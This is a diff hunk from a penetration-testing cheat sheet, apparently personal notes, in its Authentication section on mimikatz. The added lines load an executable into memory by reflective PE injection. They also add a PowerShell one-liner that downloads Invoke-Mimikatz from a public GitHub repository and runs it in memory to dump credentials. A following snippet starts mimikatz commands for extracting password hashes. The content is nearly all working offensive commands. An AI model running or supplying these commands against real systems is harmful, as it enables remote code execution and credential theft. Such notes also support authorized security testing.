@@ -142,9 +142,15 @@ kali: uupload data
 ### Authentication
 ###### Minikatz(require local admin)
 Load DemoEXE and run it locally.  
+```
 $PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')  
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Invoke-ReflectivePEInjection.ps1
+```
+Powershell run minikatz
+```
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+```
 ```
 password hash:
 1. privilege::debug
